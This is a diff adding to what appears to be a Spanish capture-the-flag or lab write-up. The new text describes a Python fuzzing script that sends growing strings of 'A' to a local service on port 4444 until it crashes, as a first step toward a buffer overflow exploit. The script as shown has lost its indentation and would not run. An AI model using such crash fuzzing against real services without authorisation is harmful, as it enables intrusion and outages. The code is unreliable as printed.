@@ -272,4 +272,40 @@ ttttt@5b855bbf2e63:~$
 </pre>
 
 Viendo esto vamos a pasarnoslo a nuestra máquina para poder probar cosas con él. 
-Usaremos el siguiente script para pasarle "A" hasta que crashee para saber si es vulnerable a buffer overflow 
+Usaremos el siguiente script para pasarle "A" hasta que crashee para saber si es vulnerable a buffer overflow.
+
+<pre>
+<code>
+
+#!/usr/bin/env python3
+
+import socket
+import time
+import sys
+
+ip = "172.17.0.2"
+port = 4444
+timeout = 1
+prefix = ""
+
+string = prefix + "A" * 100
+
+while True:
+try:
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+s.settimeout(timeout)
+s.connect((ip, port))
+s.recv(1024)
+print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+s.send(bytes(string, "latin-1"))
+s.recv(1024)
+
+except Exception as e:
+print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+sys.exit(0)
+
+string += "A" * 100
+time.sleep(1)
+
+</code>
+</pre>
